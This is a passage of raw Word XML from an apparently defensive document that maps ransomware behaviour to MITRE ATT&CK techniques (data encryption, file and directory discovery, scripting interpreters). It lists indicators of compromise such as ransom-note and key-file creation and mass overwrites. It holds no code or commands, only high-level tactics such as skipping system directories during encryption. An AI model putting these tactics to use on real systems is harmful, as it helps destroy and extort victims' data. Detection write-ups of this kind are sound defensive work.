          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0001310C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="0001310C" w:rsidRPr="0001310C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted</w:t>
      </w:r>
      <w:r w:rsidR="003F1A9E" w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F943F3" w14:textId="37646B08" w:rsidR="0099170B" w:rsidRPr="005F602B" w:rsidRDefault="003F1A9E" w:rsidP="003F1A9E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Why it’s used: </w:t>
      </w:r>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>The goal is to maximize impact by disrupting business operations and coercing victims into paying a ransom or permanently denying access to critical data.</w:t>
      </w:r>
      <w:r w:rsidR="009A6F72" w:rsidRPr="005F602B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D1B082" w14:textId="77777777" w:rsidR="0099170B" w:rsidRDefault="002B036E" w:rsidP="0099170B">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002B036E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">IOC: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707B6EFA" w14:textId="7B6C1384" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Mass </w:t>
      </w:r>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FILE_OVERWRITE</w:t>
      </w:r>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> activity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5D4D7A" w14:textId="1FCA26A2" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>File size changes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78722772" w14:textId="780297C6" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Creation of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>decrypt_key.key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> (encryption key file)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E60305B" w14:textId="6931FF30" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Creation of README.txt (ransom note)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2BFB48" w14:textId="1535B58F" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Syslog events:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4153EC65" w14:textId="77777777" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FILE_ENCRYPTED</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA0C677" w14:textId="77777777" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ATTACK_START</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71EAB305" w14:textId="77777777" w:rsidR="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ATTACK_COMPLETE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA9BFA5" w14:textId="117E104B" w:rsidR="00A722B0" w:rsidRPr="00A722B0" w:rsidRDefault="00A722B0" w:rsidP="00A722B0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C43CDC3" wp14:editId="53217716">
            <wp:extent cx="5486400" cy="694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694055"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F0A30C" w14:textId="77777777" w:rsidR="009A6F72" w:rsidRPr="007D4A97" w:rsidRDefault="009A6F72" w:rsidP="009A6F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4519E87E" w14:textId="297527D8" w:rsidR="009A6F72" w:rsidRPr="00F44E1E" w:rsidRDefault="002B036E" w:rsidP="009A6F72">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002B036E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Discovery T1083</w:t>
      </w:r>
      <w:r w:rsidR="00F44E1E" w:rsidRPr="00F44E1E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F44E1E" w:rsidRPr="002B036E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>File and Directory Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298C472F" w14:textId="77777777" w:rsidR="007D4A97" w:rsidRPr="003F1A9E" w:rsidRDefault="007D4A97" w:rsidP="007D4A97">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
      <w:r w:rsidR="002B036E" w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This technique involves enumerating files and directories or searching specific locations on a host or network share to identify valuable information within the file system. Adversaries use file and directory discovery to understand the structure, contents, and accessibility of data before taking further action.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1682158F" w14:textId="77777777" w:rsidR="007D4A97" w:rsidRDefault="007D4A97" w:rsidP="007D4A97">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Why</w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>used</w:t>
      </w:r>
      <w:r w:rsidR="002B036E" w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>For ransomware, this technique serves as a preparatory stage before encryption. System directories (such as C:\Windows and C:\Program Files) are typically excluded to avoid destabilizing or crashing the system before the attack is completed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E95B8E" w14:textId="1781CF77" w:rsidR="00F44E1E" w:rsidRDefault="002B036E" w:rsidP="007D4A97">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002B036E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>IOC</w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5898D59B" w14:textId="77777777" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Unusual directory traversal activity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A477046" w14:textId="77777777" w:rsidR="003F1A9E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Logs showing mass file READ/OPEN operations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AB2CE3" w14:textId="6CB83C9B" w:rsidR="003F1A9E" w:rsidRDefault="003F1A9E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">High activity in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>auditd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Linux) or Sysmon (Windows)</w:t>
      </w:r>
      <w:r w:rsidR="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7985C79D" w14:textId="100FC4F3" w:rsidR="00A722B0" w:rsidRPr="003F1A9E" w:rsidRDefault="00A722B0" w:rsidP="00A722B0">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="480352A8" wp14:editId="359CFAF1">
            <wp:extent cx="5486400" cy="8705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870585"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="362A16FA" w14:textId="77777777" w:rsidR="003F1A9E" w:rsidRPr="00C324AC" w:rsidRDefault="003F1A9E" w:rsidP="003F1A9E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BB2E7AB" w14:textId="77777777" w:rsidR="007D4A97" w:rsidRPr="007D4A97" w:rsidRDefault="007D4A97" w:rsidP="00F44E1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21E8ABB3" w14:textId="14817274" w:rsidR="00F44E1E" w:rsidRPr="005F602B" w:rsidRDefault="002B036E" w:rsidP="00F44E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F44E1E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Execution T1059 — Command and Scripting Interpreter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702FA1D1" w14:textId="2FA54F9A" w:rsidR="00F44E1E" w:rsidRPr="003F1A9E" w:rsidRDefault="003F1A9E" w:rsidP="00C449BF">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Description: </w:t>
      </w:r>
      <w:r w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This technique involves adversaries abusing command-line interfaces and scripting interpreters to execute commands, scripts, or binaries on a target system. Common examples include Windows Command Shell, PowerShell, Unix/Linux shells, and cross-platform interpreters such as Python, as well as scripting languages like JavaScript and Visual Basic.</w:t>
      </w:r>
      <w:r w:rsidR="002B036E" w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B694F9" w14:textId="77777777" w:rsidR="00C449BF" w:rsidRPr="00C449BF" w:rsidRDefault="00C449BF" w:rsidP="00C449BF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T1059 includes the use of various interpreters, such as:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7DE860"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Windows Command Shell (cmd.exe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C48957F"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PowerShell (powershell.exe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179C1543"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 xml:space="preserve">Unix shells (bash, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C449BF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>zsh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
